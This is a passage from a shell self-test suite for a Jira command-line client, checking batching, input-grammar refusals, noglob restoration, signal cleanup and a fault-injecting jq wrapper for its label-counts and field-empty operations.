  # now (correctly) refuses the whole op afterwards (rc 2) — this leg's own assertions are about the
  # REQUEST shape (count + each body's key list), written by the shim before that refusal happens.
  _tj_fx cloud-labels-empty
  rm -f "$tmpd"/.body.* "$tmpd/.bodyseq"
  : > "$argvlog"
  set -- https://ex.atlassian.net cloud AB size
  l9_i=1
  while [ "$l9_i" -le 101 ]; do
    set -- "$@" "AB-$l9_i"
    l9_i=$((l9_i + 1))
  done
  l9_rc=0
  tj_label_counts "$@" > "$tmpd/l9.out" 2>"$tmpd/l9.err" || l9_rc=$?
  l9_reqs=$(wc -l < "$argvlog" | tr -d ' ')
  l9_body1=$(cat "$tmpd/.body.1" 2>/dev/null) || true
  l9_body2=$(cat "$tmpd/.body.2" 2>/dev/null) || true
  l9_ok=1
  [ "$l9_rc" -eq 2 ] || l9_ok=0
  [ ! -s "$tmpd/l9.out" ] || l9_ok=0
  [ "$l9_reqs" -eq 2 ] || l9_ok=0
  case "$l9_body1" in
    *'AB-100)"'*) : ;;
    *) l9_ok=0 ;;
  esac
  case "$l9_body1" in
    *'AB-101'*) l9_ok=0 ;;
  esac
  case "$l9_body2" in
    *'"project = \"AB\" AND key in (AB-101)"'*) : ;;
    *) l9_ok=0 ;;
  esac
  if [ "$l9_ok" -eq 1 ]; then
    echo "PASS: selftest — more than 100 ids batch into exactly 2 requests of <=100 ids each, the first body's key list ending AB-100 and never carrying AB-101, the second body's key list exactly AB-101, then rc 2 empty stdout since neither batch's (empty) response covers the requested set (T3ac leg 9 / T3ac-fix1 B1)"
  else
    echo "FAIL: selftest — 101 ids did not batch as expected (rc=$l9_rc reqs=$l9_reqs body1='$l9_body1' body2='$l9_body2' err='$(cat "$tmpd/l9.err" 2>/dev/null)')"; sfail=1
  fi

  # --- T3b step 0b leg 2: a signal (TERM) mid-`label-counts` — its own `_lc_buf` temp, created
  # OUTSIDE `_tj_search_all` — must also be cleaned. Reuses the 0e legs' PATH-level mktemp wrapper
  # to capture EVERY run dir created during the call (this op's own outer one, plus
  # `_tj_search_all`'s own nested one) and asserts every one of them is gone afterward.
  : > "$tmpd/.rdlog"; : > "$tmpd/.rdfallback"
  PATH="$rdbin:$rd_origpath"; export PATH
  _tj_fx cloud-labels-page
  echo TERM > "$tmpd/.selfsignal"
  lcsig_rc=0
  tj_label_counts https://ex.atlassian.net cloud AB size AB-1 > "$tmpd/lcsig.out" 2>"$tmpd/lcsig.err" || lcsig_rc=$?
  PATH=$rd_origpath; export PATH
  rm -f "$tmpd/.selfsignal"
  lcsig_dirs=$(cat "$tmpd/.rdlog" 2>/dev/null)
  # NV-1: without its OWN private run dir, label-counts' _lc_buf mktemp falls back to the system
  # default (unlogged here) and only `_tj_search_all`'s OWN inner rundir would ever appear in
  # .rdlog — asserting "every logged dir is gone" alone would stay vacuously green in that case.
  # Requiring >= 2 dirs (this op's own outer one, housing _lc_buf, PLUS _tj_search_all's inner one)
  # makes the _lc_buf fix itself load-bearing for this leg.
  lcsig_dircount=$(printf '%s\n' "$lcsig_dirs" | grep -c .)
  lcsig_gone=1
  [ "$lcsig_dircount" -ge 2 ] || lcsig_gone=0
  for lcsig_d in $lcsig_dirs; do [ -e "$lcsig_d" ] && lcsig_gone=0; done
  if [ "$lcsig_rc" -eq 143 ] && [ ! -s "$tmpd/lcsig.out" ] && [ "$lcsig_gone" -eq 1 ]; then
    echo "PASS: selftest — a TERM signal during an in-flight label-counts call ends it at once (rc 143, empty stdout) and leaves no entry in any private run directory it created, including its own _lc_buf's (T3b step 0b leg 2)"
  else
    echo "FAIL: selftest — a TERM signal during an in-flight label-counts call was not cleanly handled (rc=$lcsig_rc out='$(cat "$tmpd/lcsig.out" 2>/dev/null)' dircount=$lcsig_dircount dirs='$lcsig_dirs' gone=$lcsig_gone)"; sfail=1
  fi

  # --- T3b step 0c item 1 / T3b-0 fix1 Q3: label-counts checks project grammar FIRST — a
  # project/id pair that is mutually self-consistent but grammar-invalid ('AB *' / 'AB *-1') must
  # refuse before any request. Q3: the rc/request-count assertion alone is VACUOUS for this specific
  # line — `_tj_search_all`'s own downstream `_tj_project_ok` backstops it either way — so this now
  # ALSO observes the fail-fast directly: the rdlog `mktemp` wrapper must log ZERO run dirs, proving
  # the refusal fired before `_tj_rundir_run` ever created one.
  : > "$argvlog"
  : > "$tmpd/.rdlog"; : > "$tmpd/.rdfallback"
  PATH="$rdbin:$rd_origpath"; export PATH
  lcproj_rc=0
  tj_label_counts https://ex.atlassian.net cloud 'AB *' size 'AB *-1' >/dev/null 2>"$tmpd/lcproj.err" || lcproj_rc=$?
  PATH=$rd_origpath; export PATH
  lcproj_reqs=$(wc -l < "$argvlog" | tr -d ' ')
  lcproj_rundirs=$(wc -l < "$tmpd/.rdlog" | tr -d ' ')
  if [ "$lcproj_rc" -eq 1 ] && [ "$lcproj_reqs" -eq 0 ] && [ "$lcproj_rundirs" -eq 0 ]; then
    echo "PASS: selftest — label-counts refuses a grammar-invalid project before any request, rc 1, zero requests, zero run dirs created (T3b step 0c item 1 / fix1 Q3)"
  else
    echo "FAIL: selftest — a grammar-invalid project was not refused pre-request (rc=$lcproj_rc reqs=$lcproj_reqs rundirs=$lcproj_rundirs err='$(cat "$tmpd/lcproj.err" 2>/dev/null)')"; sfail=1
  fi

  # --- T3b step 0c item 2: the dedup step's `set -f`/`set +f` must restore the CALLER's own
  # noglob state, not clear it unconditionally — a caller with `set -f` already on keeps it on.
  _tj_fx cloud-labels-page
  ( set -f
    tj_label_counts https://ex.atlassian.net cloud AB size AB-1 AB-2 AB-3 AB-4 >/dev/null 2>&1 || true
    case $- in
      *f*) echo "PASS: selftest — label-counts restores the CALLER's own noglob state (set -f stays on) after the call (T3b step 0c item 2)" ;;
      *) echo "FAIL: selftest — label-counts turned OFF the caller's own noglob state (T3b step 0c item 2)"; exit 1 ;;
    esac
  ) || sfail=1

  # --- T3b-0 fix1 Q2: mirror of the item 2 leg above — a caller with noglob OFF must still have it
  # OFF after label-counts (a mutant that never restores, i.e. always leaves `set -f` ON, passes the
  # ON->ON leg above but must fail THIS one).
  _tj_fx cloud-labels-page
  ( case $- in
      *f*) set +f ;;
    esac
    tj_label_counts https://ex.atlassian.net cloud AB size AB-1 AB-2 AB-3 AB-4 >/dev/null 2>&1 || true
    case $- in
      *f*) echo "FAIL: selftest — label-counts left noglob ON for a caller that started OFF (T3b-0 fix1 Q2)"; exit 1 ;;
      *) echo "PASS: selftest — label-counts leaves the caller's noglob OFF, unchanged, after the call (T3b-0 fix1 Q2)" ;;
    esac
  ) || sfail=1

}
_tj_st_field_empty() {

  # --- M-G11: field-empty's OWN noglob save/restore, mirroring label-counts' T3b step 0c item 2 /
  # T3b-0 fix1 Q2 legs — no dedicated leg existed for field-empty's own `set -f`/`set +f` dance
  # (only label-counts had one), so a mutant forcing `_fe_noglob=0` unconditionally went unseen.
  _tj_fx field-empty-page
  ( set -f
    tj_field_empty https://ex.atlassian.net cloud AB customfield_10077 AB-1 AB-2 AB-3 >/dev/null 2>&1 || true
    case $- in
      *f*) echo "PASS: selftest — field-empty restores the CALLER's own noglob state (set -f stays on) after the call (M-G11)" ;;
      *) echo "FAIL: selftest — field-empty turned OFF the caller's own noglob state (M-G11)"; exit 1 ;;
    esac
  ) || sfail=1

  _tj_fx field-empty-page
  ( case $- in
      *f*) set +f ;;
    esac
    tj_field_empty https://ex.atlassian.net cloud AB customfield_10077 AB-1 AB-2 AB-3 >/dev/null 2>&1 || true
    case $- in
      *f*) echo "FAIL: selftest — field-empty left noglob ON for a caller that started OFF (M-G11)"; exit 1 ;;
      *) echo "PASS: selftest — field-empty leaves the caller's noglob OFF, unchanged, after the call (M-G11)" ;;
    esac
  ) || sfail=1

  # --- T3b-core field-empty leg 1: customfield_10077 — exact JQL, the empty subset, drift-locked. ---
  _tj_fx field-empty-page
  : > "$argvlog"
  fe1_rc=0
  tj_field_empty https://ex.atlassian.net cloud AB customfield_10077 AB-1 AB-2 AB-3 > "$tmpd/fe1.out" 2>"$tmpd/fe1.err" || fe1_rc=$?
  fe1_body=$(cat "$tmpd/.lastbody" 2>/dev/null || true)
  fe1_gotjql=$(printf '%s' "$fe1_body" | jq -r '.jql' 2>/dev/null)
  fe1_expjql='project = "AB" AND key in (AB-1,AB-2,AB-3) AND cf[10077] is EMPTY'
  fe1_jqlok=0; [ "$fe1_gotjql" = "$fe1_expjql" ] && fe1_jqlok=1
  fe1_cmp=1; cmp -s "$tmpd/fe1.out" "$fixdir/ops/field-empty.out" || fe1_cmp=0
  if [ "$fe1_rc" -eq 0 ] && [ "$fe1_jqlok" -eq 1 ] && [ "$fe1_cmp" -eq 1 ]; then
    echo "PASS: selftest — field-empty customfield_10077: exact JQL, stdout matches ops/field-empty.out byte-for-byte (T3b-core field-empty leg 1)"
  else
    echo "FAIL: selftest — field-empty customfield_10077 leg failed (rc=$fe1_rc jqlok=$fe1_jqlok cmp=$fe1_cmp body='$fe1_body' out='$(cat "$tmpd/fe1.out" 2>/dev/null)' err='$(cat "$tmpd/fe1.err" 2>/dev/null)')"; sfail=1
  fi

  # --- T3b-core field-empty leg 2: description — the same op, the other spec, its own JQL clause. ---
  _tj_fx field-empty-page
  fe2_rc=0
  tj_field_empty https://ex.atlassian.net cloud AB description AB-1 AB-2 AB-3 > "$tmpd/fe2.out" 2>"$tmpd/fe2.err" || fe2_rc=$?
  # fix1 quality 6: `|| true` — a missing body file (e.g. under a fault upstream) must FAIL this
  # leg's own comparison, never abort the whole selftest via `set -eu`.
  fe2_gotjql=$(jq -r '.jql' "$tmpd/.lastbody" 2>/dev/null || true)
  fe2_expjql='project = "AB" AND key in (AB-1,AB-2,AB-3) AND description is EMPTY'
  fe2_cmp=1; cmp -s "$tmpd/fe2.out" "$fixdir/ops/field-empty.out" || fe2_cmp=0
  if [ "$fe2_rc" -eq 0 ] && [ "$fe2_gotjql" = "$fe2_expjql" ] && [ "$fe2_cmp" -eq 1 ]; then
    echo "PASS: selftest — field-empty description: exact JQL, same subset answer (T3b-core field-empty leg 2)"
  else
    echo "FAIL: selftest — field-empty description leg failed (rc=$fe2_rc jql='$fe2_gotjql' cmp=$fe2_cmp err='$(cat "$tmpd/fe2.err" 2>/dev/null)')"; sfail=1
  fi

  # --- T3b-core field-empty leg 3: a spec outside customfield_[0-9]+|description -> rc 1, 0 reqs. ---
  : > "$argvlog"
  fe3_rc=0
  tj_field_empty https://ex.atlassian.net cloud AB status AB-1 >/dev/null 2>"$tmpd/fe3.err" || fe3_rc=$?
  fe3_reqs=$(wc -l < "$argvlog" | tr -d ' ')
  if [ "$fe3_rc" -eq 1 ] && [ "$fe3_reqs" -eq 0 ] && [ "$(cat "$tmpd/fe3.err")" = "refused: field-empty spec failed grammar" ]; then
    echo "PASS: selftest — field-empty refuses a spec outside the grammar before any request (T3b-core field-empty leg 3)"
  else
    echo "FAIL: selftest — field-empty did not refuse an out-of-grammar spec pre-request (rc=$fe3_rc reqs=$fe3_reqs err='$(cat "$tmpd/fe3.err" 2>/dev/null)')"; sfail=1
  fi

  # --- T3b-core fix1 C2 (quality 2): the spec grammar (digits-only + <=10-length bound) was
  # unpinned — mC (digits-only check dropped) and mD (length bound dropped) both survived. Every
  # spec below must refuse before any request.
  for c2_spec in 'customfield_' 'customfield_1a' 'customfield_1]x' 'customfield_12345678901'; do
    : > "$argvlog"
    c2_rc=0
    tj_field_empty https://ex.atlassian.net cloud AB "$c2_spec" AB-1 >/dev/null 2>"$tmpd/c2.err" || c2_rc=$?
    c2_reqs=$(wc -l < "$argvlog" | tr -d ' ')
    if [ "$c2_rc" -eq 1 ] && [ "$c2_reqs" -eq 0 ] && [ "$(cat "$tmpd/c2.err")" = "refused: field-empty spec failed grammar" ]; then
      echo "PASS: selftest — field-empty refuses spec '$c2_spec' before any request (T3b-core fix1 C2)"
    else
      echo "FAIL: selftest — field-empty did not refuse spec '$c2_spec' pre-request (rc=$c2_rc reqs=$c2_reqs err='$(cat "$tmpd/c2.err" 2>/dev/null)')"; sfail=1
    fi
  done
  # a real embedded trailing newline — a literal quoted byte, never `$( … )` (which strips one).
  c2n_spec='customfield_10077
'
  : > "$argvlog"
  c2n_rc=0
  tj_field_empty https://ex.atlassian.net cloud AB "$c2n_spec" AB-1 >/dev/null 2>"$tmpd/c2n.err" || c2n_rc=$?
  c2n_reqs=$(wc -l < "$argvlog" | tr -d ' ')
  if [ "$c2n_rc" -eq 1 ] && [ "$c2n_reqs" -eq 0 ] && [ "$(cat "$tmpd/c2n.err")" = "refused: field-empty spec failed grammar" ]; then
    echo "PASS: selftest — field-empty refuses a trailing-newline spec before any request (T3b-core fix1 C2)"
  else
    echo "FAIL: selftest — field-empty did not refuse a trailing-newline spec pre-request (rc=$c2n_rc reqs=$c2n_reqs err='$(cat "$tmpd/c2n.err" 2>/dev/null)')"; sfail=1
  fi

  # --- T3b-core field-empty leg 4: zero ids -> rc 1, fixed sentence, zero requests. ---
  : > "$argvlog"
  fe4_rc=0
  tj_field_empty https://ex.atlassian.net cloud AB customfield_10077 >/dev/null 2>"$tmpd/fe4.err" || fe4_rc=$?
  fe4_reqs=$(wc -l < "$argvlog" | tr -d ' ')
  if [ "$fe4_rc" -eq 1 ] && [ "$fe4_reqs" -eq 0 ] && [ "$(cat "$tmpd/fe4.err")" = "refused: field-empty requires at least one id" ]; then
    echo "PASS: selftest — field-empty with zero ids refuses pre-request (T3b-core field-empty leg 4)"
  else
    echo "FAIL: selftest — field-empty with zero ids did not refuse cleanly (rc=$fe4_rc reqs=$fe4_reqs err='$(cat "$tmpd/fe4.err" 2>/dev/null)')"; sfail=1
  fi

  # --- T3b-core field-empty (preamble invariant): duplicate ids dedup to ONE request-side entry —
  # a caller-duplicated id must never split across two batches or double-count in the JQL.
  _tj_fx field-empty-page
  : > "$argvlog"
  fedd_rc=0
  tj_field_empty https://ex.atlassian.net cloud AB customfield_10077 AB-2 AB-2 AB-3 >/dev/null 2>"$tmpd/fedd.err" || fedd_rc=$?
  fedd_jql=$(jq -r '.jql' "$tmpd/.lastbody" 2>/dev/null || true)
  fedd_reqs=$(wc -l < "$argvlog" | tr -d ' ')
  if [ "$fedd_rc" -eq 0 ] && [ "$fedd_reqs" -eq 1 ] && [ "$fedd_jql" = 'project = "AB" AND key in (AB-2,AB-3) AND cf[10077] is EMPTY' ]; then
    echo "PASS: selftest — field-empty dedups a caller-duplicated id before batching (T3b-core field-empty preamble)"
  else
    echo "FAIL: selftest — a duplicated id was not deduped before batching (rc=$fedd_rc reqs=$fedd_reqs jql='$fedd_jql' err='$(cat "$tmpd/fedd.err" 2>/dev/null)')"; sfail=1
  fi

  # --- T3b-core fix1 C4 (quality 5): re-check `$# -ge 1` AFTER the dedup split — if the dedup ever
  # emptied a non-empty id list, the op must refuse, not silently answer "zero ids are empty" at rc
  # 0. `_tj_lc_dedup` is overridden inside a subshell (never escapes) to force that scenario.
  (
    _tj_lc_dedup() { :; }
    fedd0_rc=0
    tj_field_empty https://ex.atlassian.net cloud AB customfield_10077 AB-1 AB-2 \
      >"$tmpd/fedd0.out" 2>"$tmpd/fedd0.err" || fedd0_rc=$?
    if [ "$fedd0_rc" -eq 1 ] && [ ! -s "$tmpd/fedd0.out" ] \
      && [ "$(cat "$tmpd/fedd0.err")" = "refused: field-empty requires at least one id" ]; then
      echo "PASS: selftest — field-empty re-checks \$# -ge 1 after the dedup split, refusing rather than silently answering zero ids (T3b-core fix1 C4 quality-5)"
    else
      echo "FAIL: selftest — field-empty did not re-check the id count after dedup (rc=$fedd0_rc out='$(cat "$tmpd/fedd0.out" 2>/dev/null)' err='$(cat "$tmpd/fedd0.err" 2>/dev/null)')"
      exit 1
    fi
  ) || sfail=1

  # --- T3b-core field-empty leg 5a: a returned key OUTSIDE the requested set -> rc 1. ---
  _tj_fx field-empty-outside-set
  fe5a_rc=0
  tj_field_empty https://ex.atlassian.net cloud AB customfield_10077 AB-1 AB-2 AB-3 >/dev/null 2>"$tmpd/fe5a.err" || fe5a_rc=$?
  if [ "$fe5a_rc" -eq 1 ] && [ "$(cat "$tmpd/fe5a.err")" = "refused: search response returned a key outside the requested id set" ]; then
    echo "PASS: selftest — field-empty refuses a returned key outside the requested id set, rc 1 (T3b-core field-empty leg 5a)"
  else
    echo "FAIL: selftest — an out-of-set key was not refused as expected (rc=$fe5a_rc err='$(cat "$tmpd/fe5a.err" 2>/dev/null)')"; sfail=1
  fi

  # --- T3b-core field-empty leg 5b: a key duplicated ACROSS separate batches -> rc 2. Each
  # `_tj_search_all` call has its OWN fresh dedup state, so a hostile/buggy server repeating a key
  # from batch 1 in batch 2's response is not caught upstream — this op's own cross-batch check is.
  fe5b_i=1; set -- https://ex.atlassian.net cloud AB customfield_10077
  while [ "$fe5b_i" -le 101 ]; do
    set -- "$@" "AB-$fe5b_i"
    fe5b_i=$((fe5b_i + 1))
  done
  _tj_fxseq lc-batch-100 field-empty-dup-second
  fe5b_rc=0
  tj_field_empty "$@" >"$tmpd/fe5b.out" 2>"$tmpd/fe5b.err" || fe5b_rc=$?
  if [ "$fe5b_rc" -eq 2 ] && [ ! -s "$tmpd/fe5b.out" ] && [ "$(cat "$tmpd/fe5b.err")" = "unverified: search response returned a duplicated key" ]; then
    echo "PASS: selftest — field-empty refuses a key duplicated across two separate batches, rc 2, empty stdout (T3b-core field-empty leg 5b)"
  else
    echo "FAIL: selftest — a cross-batch duplicated key was not refused as expected (rc=$fe5b_rc out='$(cat "$tmpd/fe5b.out" 2>/dev/null)' err='$(cat "$tmpd/fe5b.err" 2>/dev/null)')"; sfail=1
  fi

  # --- T3b-core field-empty leg 5c: a truncated batch -> rc 2, empty stdout, never a short "empty"
  # list (absence means "not empty", so completeness rests on `_tj_search_all`'s own truncation rule).
  _tj_fx list-missing-islast
  fe5c_rc=0
  tj_field_empty https://ex.atlassian.net cloud AB customfield_10077 AB-4 AB-5 >"$tmpd/fe5c.out" 2>"$tmpd/fe5c.err" || fe5c_rc=$?
  if [ "$fe5c_rc" -eq 2 ] && [ ! -s "$tmpd/fe5c.out" ]; then
    echo "PASS: selftest — a truncated batch refuses (rc 2), never a short 'empty' list (T3b-core field-empty leg 5c)"
  else
    echo "FAIL: selftest — a truncated batch did not refuse cleanly (rc=$fe5c_rc out='$(cat "$tmpd/fe5c.out" 2>/dev/null)' err='$(cat "$tmpd/fe5c.err" 2>/dev/null)')"; sfail=1
  fi

  # --- T3b-core field-empty leg 6: 101 ids -> two batched queries (assert BOTH bodies). Both
  # batches answer zero issues (a legitimate, complete "none are empty" answer) so the assertion is
  # purely about the REQUEST shape, the label-counts T3ac leg 9 pattern.
  _tj_fx cloud-labels-empty
  rm -f "$tmpd"/.body.* "$tmpd/.bodyseq"
  : > "$argvlog"
  set -- https://ex.atlassian.net cloud AB customfield_10077
  fe6_i=1
  while [ "$fe6_i" -le 101 ]; do
    set -- "$@" "AB-$fe6_i"
    fe6_i=$((fe6_i + 1))
  done
  fe6_rc=0
  tj_field_empty "$@" > "$tmpd/fe6.out" 2>"$tmpd/fe6.err" || fe6_rc=$?
  fe6_reqs=$(wc -l < "$argvlog" | tr -d ' ')
  fe6_body1=$(jq -r '.jql' "$tmpd/.body.1" 2>/dev/null || true)
  fe6_body2=$(jq -r '.jql' "$tmpd/.body.2" 2>/dev/null || true)
  fe6_exp1='project = "AB" AND key in (AB-1,AB-2,AB-3,AB-4,AB-5,AB-6,AB-7,AB-8,AB-9,AB-10,AB-11,AB-12,AB-13,AB-14,AB-15,AB-16,AB-17,AB-18,AB-19,AB-20,AB-21,AB-22,AB-23,AB-24,AB-25,AB-26,AB-27,AB-28,AB-29,AB-30,AB-31,AB-32,AB-33,AB-34,AB-35,AB-36,AB-37,AB-38,AB-39,AB-40,AB-41,AB-42,AB-43,AB-44,AB-45,AB-46,AB-47,AB-48,AB-49,AB-50,AB-51,AB-52,AB-53,AB-54,AB-55,AB-56,AB-57,AB-58,AB-59,AB-60,AB-61,AB-62,AB-63,AB-64,AB-65,AB-66,AB-67,AB-68,AB-69,AB-70,AB-71,AB-72,AB-73,AB-74,AB-75,AB-76,AB-77,AB-78,AB-79,AB-80,AB-81,AB-82,AB-83,AB-84,AB-85,AB-86,AB-87,AB-88,AB-89,AB-90,AB-91,AB-92,AB-93,AB-94,AB-95,AB-96,AB-97,AB-98,AB-99,AB-100) AND cf[10077] is EMPTY'
  fe6_exp2='project = "AB" AND key in (AB-101) AND cf[10077] is EMPTY'
  if [ "$fe6_rc" -eq 0 ] && [ ! -s "$tmpd/fe6.out" ] && [ "$fe6_reqs" -eq 2 ] \
    && [ "$fe6_body1" = "$fe6_exp1" ] && [ "$fe6_body2" = "$fe6_exp2" ]; then
    echo "PASS: selftest — 101 ids batch into exactly 2 requests of <=100 ids each, both bodies exact, rc 0 empty stdout since neither batch is empty (T3b-core field-empty leg 6)"
  else
    echo "FAIL: selftest — 101 ids did not batch as expected (rc=$fe6_rc reqs=$fe6_reqs body1='$fe6_body1' body2='$fe6_body2' err='$(cat "$tmpd/fe6.err" 2>/dev/null)')"; sfail=1
  fi

  # --- T3b-core field-empty leg 7: a response shape failure (.issues not an array) -> rc 2. A
  # non-string .key is REFUSED (rc 1) by `_tj_search_all`'s own shared grammar gate upstream — this
  # op never sees that case separately (disclosed; `_tj_fe_shape_ok` above is defence in depth only).
  _tj_fx list-object-issues
  fe7_rc=0
  tj_field_empty https://ex.atlassian.net cloud AB customfield_10077 AB-1 >"$tmpd/fe7.out" 2>"$tmpd/fe7.err" || fe7_rc=$?
  if [ "$fe7_rc" -eq 2 ] && [ ! -s "$tmpd/fe7.out" ]; then
    echo "PASS: selftest — a response shape failure (.issues not an array) refuses, rc 2 (T3b-core field-empty leg 7)"
  else
    echo "FAIL: selftest — a shape-failing response was not refused cleanly (rc=$fe7_rc out='$(cat "$tmpd/fe7.out" 2>/dev/null)' err='$(cat "$tmpd/fe7.err" 2>/dev/null)')"; sfail=1
  fi

  # --- T3b-core fix1 C3 (quality 3): the C-sort was unpinned (mB, sort removed, survived) — an
  # out-of-order, numerically-tricky fixture (AB-3, AB-10, AB-2) must come back C-sorted byte-wise
  # (AB-10 < AB-2 < AB-3 — '1' < '2' as a BYTE, never a numeric "10 > 2" comparison).
  _tj_fx field-empty-unsorted
  c3_rc=0
  tj_field_empty https://ex.atlassian.net cloud AB customfield_10077 AB-2 AB-3 AB-10 >"$tmpd/c3.out" 2>"$tmpd/c3.err" || c3_rc=$?
  c3_exp=$(printf 'AB-10\nAB-2\nAB-3\n')
  c3_got=$(cat "$tmpd/c3.out" 2>/dev/null)
  if [ "$c3_rc" -eq 0 ] && [ "$c3_got" = "$c3_exp" ]; then
    echo "PASS: selftest — field-empty C-sorts an out-of-order response byte-wise, AB-10 before AB-2 before AB-3 (T3b-core fix1 C3)"
  else
    echo "FAIL: selftest — field-empty did not C-sort the unsorted response correctly (rc=$c3_rc got='$c3_got' err='$(cat "$tmpd/c3.err" 2>/dev/null)')"; sfail=1
  fi

}
_tj_st_rundir_oracle() {

  # --- T3b-core fix1 C1: the CLASS oracle — `A | jq … | sort … || {…; return 2;}` reports only the
  # LAST stage's status, so a failing middle `jq` used to return rc 0 with a short/empty list (seen
  # in T2c list-in-states, checked for in T3ac label-counts, found live in field-empty). A
  # PATH-level `jq` shim (the D7 technique) faults ONLY the FINAL projection call of each
  # list-producing op, never `_tj_search_all`'s own internal per-key validate/dedup calls (which
  # share the exact same `.key` filter text, MEASURED at ordinal 5 of 5 for a 2-issue page: 2
  # validate + 2 dedup + 1 final projection — d7x-ordinal mode counts and faults only the 5th; label
  # -counts' own final filter is textually unique (`labels[]?` + `@tsv`), so d7x-text mode matches it
  # directly with no counting needed). Every op must refuse rc 2, empty stdout, its own fixed
  # sentence — never a silent short/empty "answer".
  d7xbin="$tmpd/d7xbin"; mkdir -p "$d7xbin"
  D7X_REAL_JQ=$(command -v jq); export D7X_REAL_JQ
  D7X_CNT="$tmpd/.d7x-cnt"; export D7X_CNT
  cat > "$d7xbin/jq" <<'SEVENDXJQEOF'
#!/bin/sh
_last=""
for _a in "$@"; do _last=$_a; done
case "${D7X_MODE:-}" in
  ordinal)
    if [ "$_last" = ".key" ]; then
      _n=$(cat "$D7X_CNT" 2>/dev/null || echo 0); _n=$((_n + 1)); printf '%s' "$_n" > "$D7X_CNT"
      if [ "$_n" = "${D7X_N:-0}" ]; then
        printf 'jq: error: fault injected (class oracle, final projection)\n' >&2
        exit 5
      fi
    fi
    ;;
  text)
    case "$_last" in
      *labels\[\]\?*)
        printf 'jq: error: fault injected (class oracle, final projection)\n' >&2
        exit 5 ;;
    esac
    ;;
esac
exec "$D7X_REAL_JQ" "$@"
SEVENDXJQEOF
  chmod +x "$d7xbin/jq"

  # (a) list-in-states — already fixed (fix1 F1's own capture-first line).
  _tj_fx list-ready
  : > "$D7X_CNT"
  D7X_MODE=ordinal; D7X_N=5; export D7X_MODE D7X_N
  PATH="$d7xbin:$rd_origpath"; export PATH
  c1a_rc=0
  tj_list_in_states https://ex.atlassian.net cloud AB 200 3 >"$tmpd/c1a.out" 2>"$tmpd/c1a.err" || c1a_rc=$?
  PATH=$rd_origpath; export PATH
  if [ "$c1a_rc" -eq 2 ] && [ ! -s "$tmpd/c1a.out" ] && [ "$(cat "$tmpd/c1a.err")" = "unverified: could not extract the list keys" ]; then
    echo "PASS: selftest — class oracle: list-in-states refuses a faulted final projection, rc 2, empty stdout, the fixed sentence (T3b-core fix1 C1a)"
  else
    echo "FAIL: selftest — class oracle: list-in-states did not refuse a faulted final projection cleanly (rc=$c1a_rc out='$(cat "$tmpd/c1a.out" 2>/dev/null)' err='$(cat "$tmpd/c1a.err" 2>/dev/null)')"; sfail=1
  fi

  # (b) label-counts — already fixed (its own capture-first `_lc_counts=` assignment).
  _tj_fx cloud-labels-page
  D7X_MODE=text; export D7X_MODE
  PATH="$d7xbin:$rd_origpath"; export PATH
  c1b_rc=0
  tj_label_counts https://ex.atlassian.net cloud AB size AB-1 AB-2 AB-3 AB-4 >"$tmpd/c1b.out" 2>"$tmpd/c1b.err" || c1b_rc=$?
  PATH=$rd_origpath; export PATH
  if [ "$c1b_rc" -eq 2 ] && [ ! -s "$tmpd/c1b.out" ] && [ "$(cat "$tmpd/c1b.err")" = "unverified: could not compute label counts" ]; then
    echo "PASS: selftest — class oracle: label-counts refuses a faulted final projection, rc 2, empty stdout, the fixed sentence (T3b-core fix1 C1b)"
  else
    echo "FAIL: selftest — class oracle: label-counts did not refuse a faulted final projection cleanly (rc=$c1b_rc out='$(cat "$tmpd/c1b.out" 2>/dev/null)' err='$(cat "$tmpd/c1b.err" 2>/dev/null)')"; sfail=1
  fi

  # (c) field-empty — T3b-core's own S-7/F-8 gap (the reason for this fix round): line ~1137 piped
  # the extraction jq STRAIGHT into `sort`, so a faulted extraction reported `sort`'s rc (0 on an
  # empty stream), not jq's — a FALSE `dor-*=yes` (an empty "field-empty" answer reads as "no field
  # empty"). RED before the fix: rc 0 today, not the fixed sentence.
  _tj_fx field-empty-page
  : > "$D7X_CNT"
  D7X_MODE=ordinal; D7X_N=5; export D7X_MODE D7X_N
  PATH="$d7xbin:$rd_origpath"; export PATH
  c1c_rc=0
  tj_field_empty https://ex.atlassian.net cloud AB customfield_10077 AB-1 AB-2 AB-3 >"$tmpd/c1c.out" 2>"$tmpd/c1c.err" || c1c_rc=$?
  PATH=$rd_origpath; export PATH
  if [ "$c1c_rc" -eq 2 ] && [ ! -s "$tmpd/c1c.out" ] && [ "$(cat "$tmpd/c1c.err")" = "unverified: could not extract the field-empty list keys" ]; then
    echo "PASS: selftest — class oracle: field-empty refuses a faulted final projection, rc 2, empty stdout, the fixed sentence (T3b-core fix1 C1c)"
  else
    echo "FAIL: selftest — class oracle: field-empty did not refuse a faulted final projection cleanly (rc=$c1c_rc out='$(cat "$tmpd/c1c.out" 2>/dev/null)' err='$(cat "$tmpd/c1c.err" 2>/dev/null)')"; sfail=1
  fi
  unset D7X_MODE D7X_N

  # --- T3b-0 fix1 Q1: the INT/TERM traps on `_tj_rundir_run`'s OWN subshell were untested — every
  # existing signal leg (T3b step 0b) signals the in-flight REQUEST's fork, never the wrapper
  # subshell itself. Send a signal directly to the wrapper with no descendant in between
  # (`sh -c 'kill -SIG $PPID'`, PPID from inside that child IS the wrapper subshell) and assert the
  # conventional rc and its rundir temp is gone. T3b-core step 0b: an INT-only leg added (TERM-only
  # before); `sleep 5` shortened — a live trap never reaches it, only a broken one would wait it out.
  _tj_rr_sig_body() {
    _rrtb_f=$(_tj_mktemp probe) || return 2
    printf '%s\n' "$_rrtb_f" > "$tmpd/rrtb-path.txt"
    sh -c "kill -$1 \$PPID"
    sleep 1
  }
  for q1_sig in TERM INT; do
    case "$q1_sig" in
      TERM) q1_exprc=143 ;;
      INT) q1_exprc=130 ;;
    esac
    # T3b-0 fix1 Q1 (leg precondition, test-only): a background-started non-interactive shell
    # inherits SIGINT ignored (a trap can't un-ignore it), so probe deliverability first — the
    # TERM twin above still covers the wrapper's trap wiring when INT can't be.
    if [ "$q1_sig" = INT ]; then
      q1_int_rc=0
      ( trap 'exit 7' INT; sh -c 'kill -INT $PPID'; sleep 1 ) || q1_int_rc=$?
      if [ "$q1_int_rc" -ne 7 ]; then
        echo "SKIP: selftest — Q1 INT: SIGINT is ignored at entry in this process (started as a background job); the TERM twin covers the wrapper"
        continue
      fi
    fi
    rm -f "$tmpd/rrtb-path.txt"
    q1_rc=0
    _tj_rundir_run _tj_rr_sig_body "$q1_sig" || q1_rc=$?
    q1_path=$(cat "$tmpd/rrtb-path.txt" 2>/dev/null || true)
    q1_gone=0; [ -n "$q1_path" ] && [ ! -e "$q1_path" ] && q1_gone=1
